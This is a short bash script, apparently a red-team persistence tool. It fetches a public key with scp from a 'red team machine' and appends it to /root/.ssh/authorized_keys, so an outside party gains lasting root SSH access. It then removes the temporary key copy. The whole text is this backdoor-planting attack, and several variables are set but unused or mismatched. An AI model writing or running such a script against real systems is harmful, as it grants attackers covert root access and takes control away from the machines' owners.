#!/bin/bash
ip="$IP"
Port="$Port"
User="$user"
variable='pk'
mkdir /root/.ssh
touch /root/.ssh/authorized_keys
mkdir /root/pk
read -p "enter the full path to the public key on the red team machine: " pk
scp $user@$ip:$pk /root/pk/
cat /root/pk/* >> /root/.ssh/authorized_keys
rm /root/pk/*
rmdir /root/pk
